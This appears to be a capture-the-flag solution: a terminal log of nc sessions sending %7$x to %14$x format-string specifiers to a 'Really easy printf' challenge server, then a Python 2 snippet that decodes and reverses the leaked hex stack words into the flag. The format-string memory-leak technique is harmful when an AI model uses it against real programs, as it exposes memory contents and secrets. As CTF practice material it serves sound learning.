# [Desktop] nc 47.94.129.246 10001                                       4:00:35 
# %7$x
# Really easy printf
# 67616c66
# [Desktop] nc 47.94.129.246 10001                                       4:01:35 
# %8$x
# Really easy printf
# 3661617b
# [Desktop] nc 47.94.129.246 10001                                       4:01:40 
# %9$x
# Really easy printf
# 30643334
# [Desktop] nc 47.94.129.246 10001                                       4:01:44 
# %10$x
# Really easy printf
# 37352d37
# [Desktop] nc 47.94.129.246 10001                                       4:01:47 
# %11$x
# Really easy printf
# 342d3166
# [Desktop] nc 47.94.129.246 10001                                       4:01:54 
# %12$x
# Really easy printf
# 2d666238
# [Desktop] nc 47.94.129.246 10001                                       4:02:01 
# %13$x
# Really easy printf
# 61663561
# [Desktop] nc 47.94.129.246 10001                                       4:02:06 
# %14$x
# Really easy printf
# 37312d

str = '37312d616635612d666238342d316637352d37306433343661617b67616c66'
flag = ''
for i in range(len(str) / 2):
    flag += chr(int(str[2*i:2*(i+1)], 16))
flag = flag[::-1]
print flag